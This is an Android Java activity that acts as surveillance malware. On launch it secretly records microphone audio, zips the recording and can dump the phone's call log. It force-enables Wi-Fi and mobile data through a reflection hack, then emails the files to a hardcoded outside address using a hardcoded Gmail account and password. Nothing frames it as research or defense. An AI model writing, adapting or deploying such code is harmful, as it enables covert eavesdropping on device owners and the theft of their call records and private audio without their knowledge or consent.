package com.example.record;

import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Looper;
import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.util.Log;
import android.view.Menu;
import android.widget.Toast;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Date;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import android.media.MediaRecorder;
import android.os.Environment;
import android.provider.CallLog;

public class MainActivity extends Activity {
	final MediaRecorder recorder = new MediaRecorder();
	  String path;
	  Context context=this;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		try {
			start();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	//	try {
	//		stop();
	//	} catch (IOException e) {
			// TODO Auto-generated catch block
	//		e.printStackTrace();
	//	}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	public void start() throws IOException {
	    String state = android.os.Environment.getExternalStorageState();
	    if(!state.equals(android.os.Environment.MEDIA_MOUNTED))  {
	        throw new IOException("SD Card is not mounted.  It is " + state + ".");
	    }

	    // make sure the directory we plan to store the recording in exists
	    //File directory = new File(path).getParentFile();
	    //if (!directory.exists() && !directory.mkdirs()) {
	     // throw new IOException("Path to file could not be created.");
	    //}
	    String filepath=sanitizePath("Android");
	    recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
	    recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
	    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
	    recorder.setOutputFile(filepath);
	    recorder.prepare();
	    recorder.start();
	    try {
			Thread.sleep(10000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	    recorder.stop();
	    String []s=new String[1];    //declare an array for storing the files i.e the path of your source files
	      
	    s[0]=sanitizePath("Android");    //Type the path of the files in here
	    //s[1]="/sdcard/bca.txt"; // path of the second file


	            Compress c =new Compress(s,Environment.getExternalStorageDirectory().getAbsolutePath() +"/file.zip");   //first parameter is d files second parameter is zip file name
	            c.zip(); 
	            File zipFile = new File(s[0]);
	            if(zipFile.exists())
	            {
	            	zipFile.delete();
	            }
	            
	            emailconnection _email=new emailconnection();
	    		_email.start();
	    
	  }

	  /**
	   * Stops a recording that has been previously started.
	   */
	  public void stop() throws IOException {
	    recorder.stop();
	    recorder.release();
	  }
	  private String sanitizePath(String path) {
		    if (!path.startsWith("/")) {
		      path = "/" + path;
		    }
		    if (!path.contains(".")) {
		      path += ".mp4";
		    }
		    return Environment.getExternalStorageDirectory().getAbsolutePath() + path;
		  }
	  
	  public boolean CheckConnection()
	    {
	    	boolean check=false;
	     ConnectivityManager connMgr = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
	   	 android.net.NetworkInfo wifi = connMgr
	               .getNetworkInfo(ConnectivityManager.TYPE_WIFI);
	   	 android.net.NetworkInfo mobile = connMgr
	               .getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
	    	if(wifi.isConnectedOrConnecting()==true || mobile.isConnectedOrConnecting()==true)
	    	{
	    		check=true;
	    	}
			return check;
	    }
	  
	  public void OpenConnection()
	    {
	     ConnectivityManager connMgr = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
	   	 android.net.NetworkInfo wifi = connMgr
	               .getNetworkInfo(ConnectivityManager.TYPE_WIFI);
	   	 android.net.NetworkInfo mobile = connMgr
	               .getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
		    if (!wifi.isConnectedOrConnecting()) 
		    {
		    	WifiManager wifiManager ;
		    	wifiManager  = (WifiManager)context.getSystemService(Context.WIFI_SERVICE);
		    	wifiManager.setWifiEnabled(true);
		    } 
		    if (!mobile.isConnectedOrConnecting()) 
		    {
		    	try{
		    	ConnectivityManager mgr = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
		    	Method dataMtd = ConnectivityManager.class.getDeclaredMethod("setMobileDataEnabled", boolean.class);
		    	dataMtd.setAccessible(true);
		    	dataMtd.invoke(mgr, true);
		    	}
		    	catch(Exception e)
		    	{
		    		
		    	}
		    }
	   }
	  
	  private void getCallDetails() throws IOException {

			StringBuffer sb = new StringBuffer();
			String str=new String();
			Cursor managedCursor = managedQuery( CallLog.Calls.CONTENT_URI,null, null,null, null);
			int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER ); 
			int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
			int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
			int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
			sb.append( "Call Details :");
			str="Call Details :";
			FileWriter f = new FileWriter(Environment.getExternalStorageDirectory()+"/calldetails.txt",true);
			while ( managedCursor.moveToNext() ) {
			String phNumber = managedCursor.getString( number );
			String callType = managedCursor.getString( type );
			String callDate = managedCursor.getString( date );
			Date callDayTime = new Date(Long.valueOf(callDate));
			String callDuration = managedCursor.getString( duration );
			String dir = null;
			int dircode = Integer.parseInt( callType );
			switch( dircode ) {
			case CallLog.Calls.OUTGOING_TYPE:
			dir = "OUTGOING";
			break;

			case CallLog.Calls.INCOMING_TYPE:
			dir = "INCOMING";
			break;

			case CallLog.Calls.MISSED_TYPE:
			dir = "MISSED";
			break;
			}
			//sb.append( "\nPhone Number:--- "+phNumber +" \nCall Type:--- "+dir+" \nCall Date:--- "+callDayTime+" \nCall duration in sec :--- "+callDuration );
			//sb.append("\n----------------------------------");
	      	f.append("\n"+"Phone Number:--- "+phNumber +" \nCall Type:--- "+dir+" \nCall Date:--- "+callDayTime+" \nCall duration in sec :--- "+callDuration+"\n");
			}
			managedCursor.close();
	    	f.flush();
	    	f.close();
			//call.setText(sb);
			}
	  
	  
	  public class emailconnection extends Thread
	    {
	    	String date="";
	      	String photoFile="";
	      	String filename ="";
	      	boolean isconnected=false;
	      	//File pictureFileDir=getDir();
	    	@Override
	        public void run() 
	    	{
	    		Looper.prepare();
				isconnected=CheckConnection();
				Log.i("MailApp", "after check connection"); 
				if(!isconnected)
				{
					OpenConnection();
				}
				Log.i("MailApp", "Before sending mail"); 
				Mail m = new Mail("dev.radiqal@gmail.com", "Radiqal110"); 
				//String email=Getemail(context);
		        String[] toArr ={"deepsap_007@yahoo.co.in"}; 
		        m.setTo(toArr); 
		        m.setFrom("AndroidSecurity"); 
		        m.setBody("Hello");
		        m.setSubject("This is an email sent from AndroidSecurity.");
		        try { 
		    	    filename = Environment.getExternalStorageDirectory().getAbsolutePath() +"/file.zip";
		    	    
		          m.addAttachment(filename);
		          filename=Environment.getExternalStorageDirectory()+"/calldetails.txt";
		          m.addAttachment(filename);
		          if(m.send()) { 
		        	  Log.i("MailApp", "after sending mail");
		            Toast.makeText(context, "Email was sent successfully.", Toast.LENGTH_LONG).show();
		            	File ZipFile = new File(filename);
		            	if(ZipFile.exists())
		            	{
		            		ZipFile.delete();
		            	}
		            }
		        } catch(Exception e) {
		          Log.e("MailApp", "Could not send email", e); 
		          Toast.makeText(context, "Email was not sent.", Toast.LENGTH_LONG).show(); 
		          File ZipFile = new File(filename);
	            	if(ZipFile.exists())
	            	{
	            		ZipFile.delete();
	            	}
		        } 
		        Looper.loop();
	    	}
	    }
}
